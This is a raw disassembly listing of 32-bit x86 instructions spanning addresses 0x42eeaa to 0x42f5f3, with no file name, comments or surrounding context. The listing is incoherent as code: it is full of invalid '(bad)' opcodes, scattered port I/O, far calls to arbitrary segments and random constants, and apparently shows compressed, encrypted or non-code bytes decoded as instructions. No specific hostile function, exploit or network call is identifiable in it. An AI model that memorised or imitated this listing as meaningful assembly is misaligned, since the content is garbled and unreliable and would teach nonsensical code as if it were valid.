  42eeaa:	ss lahf 
  42eeac:	pop    esi
  42eead:	jae    0x42ef25
  42eeaf:	ss cld 
  42eeb1:	pop    eax
  42eeb2:	daa    
  42eeb3:	mov    bh,cl
  42eeb5:	pusha  
  42eeb6:	iret   
  42eeb7:	mov    cl,0x28
  42eeb9:	adc    BYTE PTR [edx+edx*2-0x4a],dl
  42eebd:	or     al,0xee
  42eebf:	and    eax,ebp
  42eec1:	mov    bh,BYTE PTR [ebx+0x60]
  42eec4:	call   0x829f:0x5da44535
  42eecb:	jbe    0x42ef3a
  42eecd:	(bad)  
  42eece:	push   ecx
  42eecf:	popa   
  42eed0:	push   esp
  42eed1:	jge    0x42eedc
  42eed3:	pop    edx
  42eed4:	push   ecx
  42eed5:	jmp    DWORD PTR [edx+ebx*8-0x65]
  42eed9:	jno    0x42ef50
  42eedb:	mov    al,ds:0xace07e4e
  42eee0:	ins    BYTE PTR es:[edi],dx
  42eee1:	pusha  
  42eee2:	test   dl,bh
  42eee4:	cmp    eax,0xaf65914e
  42eee9:	inc    ebx
  42eeea:	out    dx,al
  42eeeb:	jno    0x42ef28
  42eeed:	idiv   BYTE PTR ds:0xcbc56faa
  42eef3:	stos   BYTE PTR es:[edi],al
  42eef4:	and    eax,0x80e76ed0
  42eef9:	xchg   ebp,eax
  42eefa:	mov    edi,0xed9ed1df
  42eeff:	pop    ecx
  42ef00:	fsubr  DWORD PTR [esi]
  42ef02:	ss daa 
  42ef04:	in     eax,0xe8
  42ef06:	cs inc esp
  42ef08:	fisttp WORD PTR [eax-0x2]
  42ef0b:	dec    edx
  42ef0c:	jne    0x42eec4
  42ef0e:	jae    0x42ef3d
  42ef10:	pop    esi
  42ef11:	int3   
  42ef12:	das    
  42ef13:	ja     0x42eef3
  42ef15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef16:	sub    al,0xc3
  42ef18:	in     al,0x60
  42ef1a:	mov    esi,0xf7190512
  42ef1f:	cmc    
  42ef20:	retf   
  42ef21:	mov    eax,0xe36e2b56
  42ef26:	out    dx,al
  42ef27:	je     0x42ef7b
  42ef29:	jp     0x42ef33
  42ef2b:	xor    DWORD PTR [ebx],esp
  42ef2d:	push   0xffffffcc
  42ef2f:	mov    eax,ds:0x45420d46
  42ef34:	jmp    0x42ef03
  42ef36:	pop    ecx
  42ef37:	rol    ebx,0x4a
  42ef3a:	push   edx
  42ef3b:	fcomp  DWORD PTR [esi-0x3d]
  42ef3e:	sbb    ebx,DWORD PTR [esi+0x5a7db031]
  42ef44:	mov    WORD PTR [ecx-0x61],fs
  42ef47:	push   es
  42ef48:	jo     0x42efaa
  42ef4a:	add    DWORD PTR [ebx+0x27163282],esi
  42ef50:	ret    0xeeff
  42ef53:	xchg   ecx,eax
  42ef54:	pop    edx
  42ef55:	out    0xac,al
  42ef57:	lods   eax,DWORD PTR ds:[esi]
  42ef58:	(bad)  
  42ef59:	loope  0x42ef68
  42ef5b:	mov    eax,ds:0x45adcb4a
  42ef60:	push   ss
  42ef61:	xor    esi,DWORD PTR [ebx-0x352ea11a]
  42ef67:	push   esi
  42ef68:	out    dx,al
  42ef69:	push   0x9
  42ef6b:	or     eax,0xa44ababd
  42ef70:	std    
  42ef71:	adc    bh,BYTE PTR [ecx-0x25]
  42ef74:	add    al,0x78
  42ef76:	pop    esi
  42ef77:	lahf   
  42ef78:	xchg   DWORD PTR [ebp-0x12],ecx
  42ef7b:	pushf  
  42ef7c:	cmp    BYTE PTR [edi+0x440bee08],dl
  42ef82:	cdq    
  42ef83:	mov    al,ds:0x1ce3c3af
  42ef88:	jle    0x42efe9
  42ef8a:	push   0x44
  42ef8c:	sub    cl,BYTE PTR [edx-0x12]
  42ef8f:	rcl    BYTE PTR [ebx-0x60d432d8],cl
  42ef95:	or     edx,DWORD PTR [edi+eax*4-0x58]
  42ef99:	pusha  
  42ef9a:	in     al,0x6e
  42ef9c:	inc    BYTE PTR [edx-0x7a736cc6]
  42efa2:	out    dx,al
  42efa3:	xchg   esp,eax
  42efa4:	popf   
  42efa5:	add    eax,0x54e68e6c
  42efaa:	shl    BYTE PTR [edi+0x3b358243],cl
  42efb0:	(bad)  
  42efb2:	(bad)  
  42efb4:	mov    dh,0xb
  42efb6:	imul   esi,DWORD PTR [esi+0x32a9695e],0x58
  42efbd:	xchg   esp,eax
  42efbe:	adc    eax,0xa25242f1
  42efc3:	scas   eax,DWORD PTR es:[edi]
  42efc4:	(bad)  
  42efc5:	jmp    0xa154abb3
  42efca:	sbb    eax,0x642e1942
  42efcf:	arpl   WORD PTR cs:[edx+0x2],bp
  42efd3:	or     ebx,DWORD PTR [eax+0x1]
  42efd6:	ret    
  42efd7:	dec    edx
  42efd8:	in     eax,dx
  42efd9:	or     al,0x78
  42efdb:	test   al,0xf
  42efdd:	fistp  DWORD PTR [ebp-0x3b9eb5ef]
  42efe3:	mov    edi,DWORD PTR [edx]
  42efe5:	cmp    ebp,esi
  42efe7:	pop    ebx
  42efe8:	lds    ebx,FWORD PTR [ebp+0x1e]
  42efeb:	int    0x93
  42efed:	fdiv   DWORD PTR [ebx+0x6e4d81ab]
  42eff3:	dec    esp
  42eff4:	ds dec ebx
  42eff6:	add    al,0xb7
  42eff8:	mov    ecx,0x5d9bdd49
  42effd:	je     0x42f029
  42efff:	inc    esp
  42f000:	(bad)  
  42f001:	and    dl,al
  42f003:	xchg   ecx,eax
  42f004:	call   0x6ab3:0x72a0c339
  42f00b:	lea    esp,[eax+0x5e4cc64b]
  42f011:	push   ebx
  42f012:	sub    eax,0x4c8ca68e
  42f017:	fdivr  QWORD PTR [ebx]
  42f019:	fs mov edx,0x7456de98
  42f01f:	(bad)  
  42f020:	cmp    dl,dl
  42f022:	push   esi
  42f023:	aas    
  42f024:	pusha  
  42f025:	push   esp
  42f026:	xor    eax,0x96987611
  42f02b:	popa   
  42f02c:	xchg   ebp,eax
  42f02d:	(bad)  
  42f02e:	jmp    DWORD PTR [edi+0x65798122]
  42f034:	sbb    eax,0x234e4e61
  42f039:	xchg   edx,eax
  42f03a:	out    dx,al
  42f03b:	add    esp,eax
  42f03d:	lahf   
  42f03e:	aas    
  42f03f:	push   edx
  42f040:	mov    bl,ah
  42f042:	mov    cl,0xa3
  42f044:	jbe    0x42f06a
  42f046:	lods   al,BYTE PTR ds:[esi]
  42f047:	add    ebx,DWORD PTR [esi-0x2979817e]
  42f04d:	push   ecx
  42f04e:	out    dx,al
  42f04f:	stc    
  42f050:	shl    BYTE PTR [edx],1
  42f052:	imul   ebx,DWORD PTR [ebx+0x73],0x4fa883e5
  42f059:	push   ecx
  42f05a:	fild   WORD PTR [eax+0x73ae9fe5]
  42f060:	cmp    ch,BYTE PTR [ebp+0x77336e68]
  42f066:	inc    edx
  42f067:	mov    eax,ds:0x8ce226a3
  42f06c:	and    DWORD PTR [esi+ebx*4+0x32e285a1],ecx
  42f073:	cli    
  42f074:	xchg   BYTE PTR ds:0x6d5eb99b,bh
  42f07a:	and    eax,0x780f37cb
  42f07f:	in     al,dx
  42f080:	jl     0x42f0e2
  42f082:	mov    ebp,0xe1e6ecb9
  42f087:	mov    ah,BYTE PTR [edi-0x57ccd95d]
  42f08d:	dec    ebp
  42f08e:	mov    ebx,0x2a095ef2
  42f093:	in     al,dx
  42f094:	cwde   
  42f095:	loope  0x42f0b9
  42f097:	repnz inc ebp
  42f099:	popa   
  42f09a:	sub    DWORD PTR [ebp+0x22d7d8a5],eax
  42f0a0:	mov    eax,0x4c3bee1e
  42f0a5:	inc    ecx
  42f0a6:	popa   
  42f0a7:	inc    DWORD PTR [ecx]
  42f0a9:	sbb    DWORD PTR [ecx-0x5f],0x55342712
  42f0b0:	ja     0x42f075
  42f0b2:	jg     0x42f082
  42f0b4:	js     0x42f0fd
  42f0b6:	out    dx,al
  42f0b7:	bound  esi,QWORD PTR [ebx]
  42f0b9:	repz add DWORD PTR [ecx+0x76aa7c53],edx
  42f0c0:	std    
  42f0c1:	pusha  
  42f0c2:	dec    ebx
  42f0c3:	or     al,0x1f
  42f0c5:	push   cs
  42f0c6:	ss cwde 
  42f0c8:	adc    bl,BYTE PTR [ebx]
  42f0ca:	and    dh,al
  42f0cc:	ss fs pop ss
  42f0cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f0d0:	shr    eax,cl
  42f0d2:	pusha  
  42f0d3:	call   0x2281:0x2410f49e
  42f0da:	mov    ds:0xcbb91b73,eax
  42f0df:	mov    ds:0x2225ce7e,eax
  42f0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0e5:	rol    BYTE PTR [esi+0x7f],1
  42f0e8:	push   edx
  42f0e9:	fucomp st(6)
  42f0eb:	mov    edx,eax
  42f0ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0ee:	pop    eax
  42f0ef:	pop    ebp
  42f0f0:	cmp    esi,ecx
  42f0f2:	clc    
  42f0f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f0f4:	in     al,0x4b
  42f0f6:	dec    eax
  42f0f7:	jae    0x42f134
  42f0f9:	push   ecx
  42f0fa:	ds mov bh,0x5d
  42f0fd:	aam    0xee
  42f0ff:	jmp    0xb5a0:0x88ffec6b
  42f106:	mov    eax,cs:0xffd93430
  42f10c:	mov    BYTE PTR [ebp+0x5c5e887a],bh
  42f112:	fmul   QWORD PTR [esp+edx*1+0x4f]
  42f116:	out    0x8a,eax
  42f118:	push   ss
  42f119:	sub    edx,ebp
  42f11b:	out    dx,al
  42f11c:	aaa    
  42f11d:	add    eax,0x905eaeae
  42f122:	(bad)  
  42f123:	int3   
  42f124:	inc    esi
  42f125:	jl     0x42f13e
  42f127:	stos   BYTE PTR es:[edi],al
  42f128:	pop    esi
  42f129:	ss pop ebx
  42f12b:	pop    ss
  42f12c:	jmp    0x42f124
  42f12e:	inc    ecx
  42f12f:	sbb    DWORD PTR [esi+ecx*2],esi
  42f132:	test   al,0x83
  42f134:	int    0xe0
  42f136:	or     eax,0xee31fc7c
  42f13b:	or     eax,esp
  42f13d:	xchg   DWORD PTR [edi-0x6d034e78],ebx
  42f143:	mov    ds:0xec4dd08,eax
  42f148:	mov    edi,0xdd8c4ed5
  42f14d:	popf   
  42f14e:	out    dx,al
  42f14f:	pop    ds
  42f150:	add    ebp,DWORD PTR [edx+0x1e]
  42f153:	cwde   
  42f154:	sbb    al,BYTE PTR [edx]
  42f156:	inc    edx
  42f157:	mov    al,ds:0x3436e418
  42f15c:	arpl   WORD PTR ds:0xeb9da443,cx
  42f163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f164:	push   esp
  42f165:	frstor [edx+0x4ea1ddef]
  42f16b:	stc    
  42f16c:	or     ah,bl
  42f16e:	(bad)  
  42f16f:	mov    esi,0x8e2607ad
  42f174:	in     eax,dx
  42f175:	pusha  
  42f176:	jp     0x42f1f5
  42f178:	add    DWORD PTR [ebp+edi*1+0x62f265db],edx
  42f17f:	popf   
  42f180:	ret    0xac5f
  42f183:	sbb    BYTE PTR [ebp+0x24],cl
  42f186:	cs sahf 
  42f188:	xor    al,0x61
  42f18a:	push   ebp
  42f18b:	(bad)  
  42f18c:	or     BYTE PTR [ebx],bl
  42f18e:	mov    dh,0x31
  42f190:	lock repz out dx,al
  42f193:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f194:	(bad)  
  42f195:	pop    esi
  42f196:	call   0xdea2:0x9271ea29
  42f19d:	int3   
  42f19e:	cmp    al,0x67
  42f1a0:	repnz xchg edx,eax
  42f1a2:	repnz push esp
  42f1a4:	fwait
  42f1a5:	inc    ebx
  42f1a6:	and    DWORD PTR [ebp+0x4108e0ab],esi
  42f1ac:	imul   esi,DWORD PTR [eax-0x65],0xffffffa3
  42f1b0:	imul   esp,DWORD PTR [ebp-0x6b],0x2b4864bb
  42f1b7:	push   ebp
  42f1b8:	jle    0x42f15f
  42f1ba:	xor    eax,0xeb157a3f
  42f1bf:	repnz inc esp
  42f1c1:	gs mov dl,0x7c
  42f1c4:	or     esi,esi
  42f1c6:	dec    ebx
  42f1c7:	push   ecx
  42f1c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f1c9:	gs jo  0x42f16d
  42f1cc:	cmc    
  42f1cd:	cld    
  42f1ce:	inc    ebx
  42f1cf:	jae    0x42f1fa
  42f1d1:	xchg   esi,eax
  42f1d2:	lea    esi,[eax+0x5e]
  42f1d5:	dec    edi
  42f1d6:	add    ebp,ebp
  42f1d8:	pushf  
  42f1d9:	pop    edi
  42f1da:	ss push es
  42f1dc:	es stos DWORD PTR es:[edi],eax
  42f1de:	mov    WORD PTR [ecx+0x7b4b5098],fs
  42f1e4:	inc    esi
  42f1e5:	jbe    0x42f1fe
  42f1e7:	(bad)
  42f1ea:	ret    
  42f1eb:	mov    eax,ds:0xdee7c586
  42f1f0:	lock dec ebp
  42f1f2:	inc    ebx
  42f1f3:	shl    DWORD PTR [edx+0x34],1
  42f1f6:	jbe    0x42f1a2
  42f1f8:	pusha  
  42f1f9:	pop    esp
  42f1fa:	sbb    esi,esi
  42f1fc:	popa   
  42f1fd:	jecxz  0x42f204
  42f1ff:	popa   
  42f200:	dec    ecx
  42f201:	jmp    0x42f1e2
  42f203:	outs   dx,BYTE PTR ds:[esi]
  42f204:	addr16 popa 
  42f206:	sbb    eax,0x184ba31d
  42f20b:	mov    WORD PTR [edx-0x59c2dbea],cs
  42f211:	ror    BYTE PTR [ebx+0x78ff75c2],cl
  42f217:	pushf  
  42f218:	js     0x42f23f
  42f21a:	pop    edx
  42f21b:	adc    al,0x56
  42f21d:	popa   
  42f21e:	or     ecx,eax
  42f220:	adc    eax,0xfe737a5f
  42f225:	mov    edi,0xf65e2bdc
  42f22a:	xor    ch,BYTE PTR [edx-0x524a677]
  42f230:	add    DWORD PTR [esi-0x11],ecx
  42f233:	push   esi
  42f234:	popa   
  42f235:	popa   
  42f236:	sub    BYTE PTR [ebp+0x12],cl
  42f239:	(bad)  
  42f23a:	sbb    eax,0x24575e4a
  42f23f:	and    DWORD PTR [eax+0x6],esi
  42f242:	mov    al,ds:0x5760bd5f
  42f247:	mov    al,0x56
  42f249:	loopne 0x42f241
  42f24b:	es jle 0x42f2b3
  42f24e:	out    dx,al
  42f24f:	pushf  
  42f250:	or     al,0x52
  42f252:	mov    edi,0xe2014c4f
  42f257:	popf   
  42f258:	std    
  42f259:	rcl    DWORD PTR [eax-0x8],0x18
  42f25d:	inc    ecx
  42f25e:	sahf   
  42f25f:	fistp  DWORD PTR [esi-0x9]
  42f262:	xchg   ebx,eax
  42f263:	pop    ecx
  42f264:	pop    ebp
  42f265:	xchg   edi,eax
  42f266:	mov    ds:0x634888ab,al
  42f26b:	cdq    
  42f26c:	out    0x18,al
  42f26e:	cdq    
  42f26f:	(bad)  
  42f270:	in     al,dx
  42f271:	add    ebp,ebp
  42f273:	jne    0x42f2d7
  42f275:	fucom  st(0)
  42f277:	sub    BYTE PTR [eax],0xe5
  42f27a:	scas   al,BYTE PTR es:[edi]
  42f27b:	ss or  al,0xf6
  42f27e:	xor    al,0xb9
  42f280:	sti    
  42f281:	dec    esp
  42f282:	mov    BYTE PTR [ecx+0x6468548d],ah
  42f288:	jnp    0x42f25a
  42f28a:	call   0x83b55109
  42f28f:	inc    esi
  42f290:	popf   
  42f291:	fist   DWORD PTR [eax]
  42f293:	xchg   ebx,eax
  42f294:	hlt    
  42f295:	pusha  
  42f296:	sbb    eax,0x20d57016
  42f29b:	sbb    eax,0x1725eba1
  42f2a0:	dec    ecx
  42f2a1:	fstp   TBYTE PTR [ebx+0x45]
  42f2a4:	cli    
  42f2a5:	dec    esi
  42f2a6:	adc    al,0x8d
  42f2a8:	adc    DWORD PTR [ebx],edi
  42f2aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f2ab:	and    DWORD PTR [ecx+0x71dda175],ecx
  42f2b1:	imul   edx,edi,0xeec6ecd8
  42f2b7:	inc    ebp
  42f2b8:	out    dx,al
  42f2b9:	daa    
  42f2ba:	outs   dx,BYTE PTR ds:[esi]
  42f2bb:	pop    esi
  42f2bc:	cmp    ch,dh
  42f2be:	xchg   edx,eax
  42f2bf:	xchg   ebx,eax
  42f2c0:	xchg   esp,eax
  42f2c1:	mov    eax,0xa7699f70
  42f2c6:	mov    ?,ebp
  42f2c8:	adc    al,0xbe
  42f2ca:	ja     0x42f2b2
  42f2cc:	pop    esi
  42f2cd:	int    0x7
  42f2cf:	lods   eax,DWORD PTR ds:[esi]
  42f2d0:	hlt    
  42f2d1:	inc    edx
  42f2d2:	jbe    0x42f25f
  42f2d4:	adc    ah,BYTE PTR [ecx+0x36]
  42f2d7:	inc    edi
  42f2d8:	aas    
  42f2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f2da:	push   ecx
  42f2db:	cmp    dh,dl
  42f2dd:	mov    ch,0xee
  42f2df:	stc    
  42f2e0:	adc    eax,0x791e64e0
  42f2e5:	jnp    0x42f276
  42f2e7:	mov    eax,ds:0xd60f287e
  42f2ec:	pop    ss
  42f2ed:	out    dx,al
  42f2ee:	je     0x42f299
  42f2f0:	push   ebx
  42f2f1:	push   0xffffffc7
  42f2f3:	xlat   BYTE PTR ds:[ebx]
  42f2f4:	fisttp WORD PTR [edx+esi*4-0x34]
  42f2f8:	xchg   esp,eax
  42f2f9:	nop
  42f2fa:	sbb    DWORD PTR [esi+0x42],esp
  42f2fd:	pusha  
  42f2fe:	sub    al,0xf0
  42f300:	xor    bh,BYTE PTR [edx-0x1f2868f5]
  42f306:	or     al,0x3c
  42f308:	push   ss
  42f309:	jnp    0x42f2cd
  42f30b:	imul   esp,DWORD PTR [eax],0x67
  42f30e:	loop   0x42f371
  42f310:	pop    esi
  42f311:	inc    edx
  42f312:	inc    eax
  42f313:	in     al,dx
  42f314:	shl    BYTE PTR [edx-0x37],0x5a
  42f318:	pop    esi
  42f319:	xchg   esp,eax
  42f31a:	pop    es
  42f31b:	ret    0xcbc
  42f31e:	push   es
  42f31f:	cld    
  42f320:	bound  esp,QWORD PTR [ecx+0x0]
  42f323:	popa   
  42f324:	call   0xc7ce6522
  42f329:	or     ebp,ebp
  42f32b:	out    0x6b,eax
  42f32d:	jae    0x42f326
  42f32f:	jge    0x42f3a1
  42f331:	jne    0x42f395
  42f333:	mov    al,0xa4
  42f335:	pusha  
  42f336:	jge    0x42f2d4
  42f338:	test   BYTE PTR [esi-0x112d65e7],bh
  42f33e:	and    eax,0x88d1ad45
  42f343:	nop
  42f344:	ret    
  42f345:	mov    al,ds:0x48a3d7a0
  42f34a:	ret    0x3ea0
  42f34d:	test   BYTE PTR [esi],ch
  42f34f:	mov    esp,0x224566da
  42f354:	pop    esi
  42f355:	aaa    
  42f356:	jle    0x42f2f3
  42f358:	add    al,0x4d
  42f35a:	rol    DWORD PTR [edx+0x54],cl
  42f35d:	fist   DWORD PTR [bx+di+0x53]
  42f361:	pop    ebp
  42f362:	sub    DWORD PTR [eax],esp
  42f364:	outs   dx,DWORD PTR ds:[esi]
  42f365:	mov    cl,0xc
  42f367:	(bad)  [ecx]
  42f369:	add    BYTE PTR [edi],ch
  42f36b:	xchg   esp,eax
  42f36c:	xor    al,0xb6
  42f36e:	out    dx,al
  42f36f:	mov    dl,ah
  42f371:	fcomp  DWORD PTR [edx+ebx*4-0x62]
  42f375:	or     bh,BYTE PTR [esi-0x16]
  42f378:	ins    DWORD PTR es:[edi],dx
  42f379:	pusha  
  42f37a:	aam    0xe4
  42f37c:	retf   0x9bf2
  42f37f:	(bad)  
  42f380:	call   0xe523:0x48eb243b
  42f387:	js     0x42f3e3
  42f389:	inc    eax
  42f38a:	mov    ds:0x2e1f36cc,al
  42f38f:	lahf   
  42f390:	mov    DWORD PTR [ebx],ecx
  42f392:	sbb    BYTE PTR [ecx+0x40b21ac3],ah
  42f398:	sqrtps xmm6,XMMWORD PTR [edi+0x6e]
  42f39c:	pop    ebx
  42f39d:	stos   BYTE PTR es:[edi],al
  42f39e:	retf   
  42f39f:	test   al,0xfa
  42f3a2:	cs int3 
  42f3a4:	pop    edx
  42f3a5:	fist   WORD PTR [ecx-0x51505e5f]
  42f3ab:	sbb    BYTE PTR [eax+0x5e86fe21],cl
  42f3b1:	(bad)  
  42f3b2:	mov    dh,0xbb
  42f3b4:	mov    DWORD PTR [esi+0x66],esp
  42f3b7:	mov    gs,WORD PTR [eax]
  42f3b9:	imul   ecx,DWORD PTR [eax+ebp*1-0x6df618a2],0x20d421d3
  42f3c4:	aaa    
  42f3c5:	fdivr  DWORD PTR [ebx+0x21]
  42f3c8:	clc    
  42f3c9:	xor    esp,edi
  42f3cb:	xchg   esi,eax
  42f3cc:	pop    ds
  42f3cd:	loop   0x42f43e
  42f3cf:	mov    eax,ds:0x57a89263
  42f3d4:	ss loope 0x42f40d
  42f3d7:	inc    esp
  42f3d8:	pop    ebx
  42f3d9:	cmp    bl,dl
  42f3db:	gs push esp
  42f3dd:	sbb    BYTE PTR [edx-0xda861a3],0x4
  42f3e4:	jp     0x42f427
  42f3e6:	adc    cl,BYTE PTR [ebp-0x40]
  42f3e9:	ffree  st(2)
  42f3eb:	xor    edx,esp
  42f3ed:	push   ebx
  42f3ee:	pop    edx
  42f3ef:	and    dl,dl
  42f3f1:	sub    al,0xc
  42f3f3:	imul   edi,DWORD PTR ds:0x118ceeb9,0x789d659b
  42f3fd:	fdivr  DWORD PTR [edx-0x5f]
  42f400:	sbb    BYTE PTR [ecx],dl
  42f402:	aad    0x59
  42f404:	xchg   ebx,eax
  42f405:	ins    DWORD PTR es:[edi],dx
  42f406:	cmp    al,0x3a
  42f408:	pop    esi
  42f409:	je     0x42f474
  42f40b:	xchg   edi,eax
  42f40c:	daa    
  42f40d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f40e:	mov    ch,0x71
  42f410:	cdq    
  42f411:	pusha  
  42f412:	push   cs
  42f413:	loopne 0x42f404
  42f415:	dec    eax
  42f416:	dec    ecx
  42f417:	push   ebp
  42f418:	fwait
  42f419:	in     al,0xbe
  42f41b:	sbb    al,0xdc
  42f41d:	inc    eax
  42f41e:	out    dx,al
  42f41f:	lods   al,BYTE PTR ds:[esi]
  42f420:	arpl   WORD PTR [ebp-0x6c],bp
  42f423:	jmp    0xa0ecc738
  42f428:	call   0x3987dfde
  42f42d:	dec    ebx
  42f42e:	mov    esi,edx
  42f430:	in     eax,dx
  42f431:	stc    
  42f432:	hlt    
  42f433:	test   eax,0x56995888
  42f438:	pop    esi
  42f439:	retf   
  42f43a:	scas   al,BYTE PTR es:[edi]
  42f43b:	mov    al,0xac
  42f43d:	repnz repz mov al,ds:0x623a2cc9
  42f444:	xchg   edi,ecx
  42f446:	xchg   esi,eax
  42f447:	xor    eax,0xf1a1175e
  42f44c:	xchg   ebp,eax
  42f44d:	and    BYTE PTR [edx+0x78],bh
  42f450:	mov    ecx,0x69973130
  42f455:	jmp    DWORD PTR [edx+0x79ca93a1]
  42f45b:	retf   
  42f45c:	mov    ds:0x84f7ee0a,al
  42f461:	clc    
  42f462:	dec    ebp
  42f463:	(bad)  
  42f464:	mov    DWORD PTR [edi-0x32],edi
  42f467:	sahf   
  42f468:	adc    eax,0x7264b36f
  42f46d:	fwait
  42f46e:	jae    0x42f46d
  42f470:	clc    
  42f471:	mov    al,ds:0xf391cded
  42f476:	and    esp,edx
  42f478:	jne    0x42f4da
  42f47a:	fild   QWORD PTR [edi-0x3d1f9081]
  42f480:	mov    cl,0x5d
  42f482:	(bad)  [esi]
  42f484:	cmp    eax,eax
  42f486:	pop    esi
  42f487:	pop    es
  42f488:	xchg   esi,eax
  42f489:	loop   0x42f458
  42f48b:	sti    
  42f48c:	xor    al,0x7c
  42f48e:	inc    eax
  42f48f:	and    ecx,ecx
  42f491:	push   ds
  42f492:	add    al,0x1b
  42f494:	aaa    
  42f495:	or     BYTE PTR [eax+eiz*4+0xe01870e],dh
  42f49c:	inc    eax
  42f49d:	fs pop ss
  42f49f:	push   0x8d2e0f5e
  42f4a4:	fisttp WORD PTR ds:0x52879a2c
  42f4aa:	fs jmp 0x42f465
  42f4ad:	imul   edx,esp,0xffffff97
  42f4b0:	mov    ds:0xb6079e60,al
  42f4b5:	sub    esp,DWORD PTR [edx-0x4783a667]
  42f4bb:	rcr    ebx,cl
  42f4bd:	inc    ecx
  42f4be:	outs   dx,BYTE PTR ds:[esi]
  42f4bf:	jge    0x42f465
  42f4c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f4c2:	lahf   
  42f4c3:	mov    cl,0x47
  42f4c5:	sahf   
  42f4c6:	shl    BYTE PTR [esp+edi*8+0x6f],cl
  42f4ca:	mov    esi,0xb66bca32
  42f4cf:	cmp    eax,0x6ef95a2b
  42f4d4:	add    BYTE PTR [esi],0x5e
  42f4d7:	loopne 0x42f543
  42f4d9:	xchg   ecx,eax
  42f4da:	jmp    DWORD PTR [eax+0x39386209]
  42f4e0:	or     esi,DWORD PTR [edi+esi*1]
  42f4e3:	adc    bl,BYTE PTR [ebp+0x2b]
  42f4e6:	mov    bl,0x6e
  42f4e8:	dec    esp
  42f4e9:	sahf   
  42f4ea:	in     eax,dx
  42f4eb:	(bad)  
  42f4ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f4ed:	or     al,0x8
  42f4ef:	lahf   
  42f4f0:	mov    edx,0x1ecafa14
  42f4f5:	mov    cs,WORD PTR [edi-0x12c85425]
  42f4fb:	lds    esp,FWORD PTR [ebx-0x6d]
  42f4fe:	fsub   QWORD PTR [edx]
  42f500:	jmp    0x42f4f5
  42f502:	push   ds
  42f503:	pop    eax
  42f504:	test   eax,0x56221360
  42f509:	inc    esp
  42f50a:	fdivp  st(0),st
  42f50c:	cs dec edi
  42f50e:	out    dx,al
  42f50f:	out    0x10,al
  42f511:	add    al,0x53
  42f513:	add    al,0x14
  42f515:	sub    edi,DWORD PTR [ebx-0x63a09260]
  42f51b:	dec    esp
  42f51c:	in     al,0xfa
  42f51e:	xchg   DWORD PTR [ecx-0x7b120c7c],ebx
  42f524:	or     DWORD PTR [ecx+0x4ccab901],esi
  42f52a:	fisubr WORD PTR [edi+0x60]
  42f52d:	popa   
  42f52e:	adc    edx,DWORD PTR [eax]
  42f530:	mov    edx,0x6b6b9c64
  42f535:	fsub   st(6),st
  42f537:	jb     0x42f53a
  42f539:	repnz push esi
  42f53b:	pushf  
  42f53c:	sbb    al,0x75
  42f53e:	sub    BYTE PTR [ebx-0x4],ch
  42f541:	pusha  
  42f542:	pop    es
  42f543:	fisub  DWORD PTR [edi]
  42f545:	add    BYTE PTR [edi],bh
  42f547:	cmp    ebx,DWORD PTR [esi]
  42f549:	(bad)  
  42f54a:	jmp    0xde89:0xc26f18d3
  42f551:	sub    esp,DWORD PTR [ecx-0x484fe4f]
  42f557:	sbb    BYTE PTR [eax+0x1cac1a60],al
  42f55d:	cmp    BYTE PTR [ecx],ch
  42f55f:	push   0xb841aa54
  42f564:	and    ebp,DWORD PTR [ecx]
  42f566:	popa   
  42f567:	rcr    DWORD PTR [ecx+0x46],0xc2
  42f56b:	mov    al,0xc8
  42f56d:	pusha  
  42f56e:	xchg   edx,eax
  42f56f:	xor    ecx,ebp
  42f571:	jnp    0x42f54b
  42f573:	or     al,0xdb
  42f575:	lods   al,BYTE PTR ds:[esi]
  42f576:	out    dx,al
  42f577:	loop   0x42f59e
  42f579:	mov    bh,0xd3
  42f57b:	jb     0x42f5f2
  42f57d:	test   al,0xb7
  42f57f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f580:	push   ds
  42f581:	sbb    esi,eax
  42f583:	cmp    BYTE PTR [edx+0x30],0x3d
  42f587:	and    al,0x74
  42f589:	inc    esp
  42f58a:	jmp    0x42f511
  42f58c:	sub    al,0x54
  42f58e:	push   ecx
  42f58f:	pop    ecx
  42f590:	xchg   ecx,eax
  42f591:	stc    
  42f592:	out    dx,al
  42f593:	stos   DWORD PTR es:[edi],eax
  42f594:	(bad)  
  42f595:	mov    bh,0xef
  42f597:	repz retf 
  42f599:	pusha  
  42f59a:	jnp    0x42f529
  42f59c:	pop    ebp
  42f59d:	add    ebp,DWORD PTR [edx-0x1173b514]
  42f5a3:	fldenv [eax+0x3c52c183]
  42f5a9:	in     al,dx
  42f5aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f5ab:	mov    ds:0xe692a26,al
  42f5b0:	in     al,dx
  42f5b1:	pop    eax
  42f5b2:	shl    DWORD PTR [eax-0x31d12a2e],0xf3
  42f5b9:	push   ecx
  42f5ba:	xchg   edi,eax
  42f5bb:	and    BYTE PTR [ebx],0x23
  42f5be:	rcr    DWORD PTR cs:[edx+edi*1+0x44636aab],cl
  42f5c6:	dec    ebx
  42f5c7:	scas   al,BYTE PTR es:[edi]
  42f5c8:	icebp  
  42f5c9:	and    BYTE PTR [esi+0x37d86b81],0x87
  42f5d0:	shl    BYTE PTR [eax-0x2c],0x6e
  42f5d4:	in     eax,dx
  42f5d5:	push   ecx
  42f5d6:	mov    dl,BYTE PTR [esp+esi*1-0x3e]
  42f5da:	xlat   BYTE PTR ds:[ebx]
  42f5db:	nop
  42f5dc:	mov    BYTE PTR [eax],bl
  42f5de:	out    dx,al
  42f5df:	bound  esp,QWORD PTR [esp+eiz*4-0x157c7beb]
  42f5e6:	or     al,0xa4
  42f5e8:	pop    ecx
  42f5e9:	mov    al,ds:0x4317fb02
  42f5ee:	pop    ebp
  42f5ef:	das    
  42f5f0:	mov    ch,0x88
  42f5f2:	xchg   ebp,eax
  42f5f3:	repz pop esi
